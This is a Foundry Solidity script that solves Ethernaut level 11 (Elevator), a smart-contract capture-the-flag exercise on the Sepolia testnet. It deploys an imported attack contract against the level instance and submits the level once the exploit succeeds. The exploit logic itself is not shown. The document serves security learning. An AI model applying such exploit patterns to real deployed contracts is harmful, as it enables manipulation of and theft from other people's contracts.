// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import "../src/Level11.sol";
import {Attack} from "../src/Level11Attack.sol";

contract Level11 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Elevator instance = Elevator(vm.envAddress("LVL11_ADDR"));

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();

        attack.atatatak(address(instance));

        if (!instance.top()) {
            console2.log("call failed");
        } else {
            ethernaut.submitLevelInstance(address(instance));
        }

        vm.stopBroadcast();
    }
}

// forge script script/Level11.s.sol --broadcast --rpc-url sepolia
